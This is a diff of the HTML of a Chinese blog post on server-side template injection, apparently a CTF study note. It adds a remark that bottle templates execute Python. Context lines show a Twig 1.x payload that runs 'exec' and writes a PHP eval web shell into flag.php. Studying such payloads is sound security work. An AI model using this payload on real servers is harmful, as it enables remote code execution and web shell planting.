@@ -19,16 +19,17 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="twig模板注入https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;9506  1.x版本payload: &#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo &#39;&#39; &gt; flag.php&quot;)&#125;&#125; 2.x&amp;#">
+    <meta name="description" content="另外，bottle 可以直接通过 % python—code 或 &lt;% %&gt;执行bottle文档 twig模板注入https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;9506  1.x版本payload: &#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_sel">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSTI模版注入">
 <meta property="og:url" content="http://mekrina.github.io/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="twig模板注入https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;9506  1.x版本payload: &#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo &#39;&#39; &gt; flag.php&quot;)&#125;&#125; 2.x&amp;#">
+<meta property="og:description" content="另外，bottle 可以直接通过 % python—code 或 &lt;% %&gt;执行bottle文档 twig模板注入https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;9506  1.x版本payload: &#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_sel">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://mekrina.github.io/blogs/images/SSTI.png">
+<meta property="og:image" content="http://mekrina.github.io/blogs/images/bottle%E5%B5%8C%E5%85%A5python%E4%BB%A3%E7%A0%81.png">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-08T06:03:31.950Z">
+<meta property="article:modified_time" content="2025-03-11T14:11:58.756Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://mekrina.github.io/blogs/images/SSTI.png">
@@ -224,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          892 字
+          910 字
         
       </span>
     
@@ -278,6 +279,7 @@
               <div class="markdown-body">
                 
                 <p><img src="/blogs/images/SSTI.png" srcset="/blogs/img/loading.gif" lazyload alt="SSTI"></p>
+<p>另外，bottle 可以直接通过 <code>% python—code </code>或 <code>&lt;% %&gt;</code>执行<br><img src="/blogs/images/bottle%E5%B5%8C%E5%85%A5python%E4%BB%A3%E7%A0%81.png" srcset="/blogs/img/loading.gif" lazyload alt="bottle嵌入python代码"><br><a target="_blank" rel="noopener" href="https://www.osgeo.cn/bottle/stpl.html">bottle文档</a></p>
 <h2 id="twig模板注入"><a href="#twig模板注入" class="headerlink" title="twig模板注入"></a>twig模板注入</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9506">https://xz.aliyun.com/news/9506</a></p>
 <ol>
 <li>1.x版本payload: <code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("echo '<?=@eval($_POST[1]);?>' > flag.php")&#125;&#125;</code></li>
@@ -411,8 +413,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/XXE/XXE/" title="XXE">
-                        <span class="hidden-mobile">XXE</span>
+                      <a href="/blogs/flask/flask%20debug%E6%A8%A1%E5%BC%8F/" title="flask debug模式">
+                        <span class="hidden-mobile">flask debug模式</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
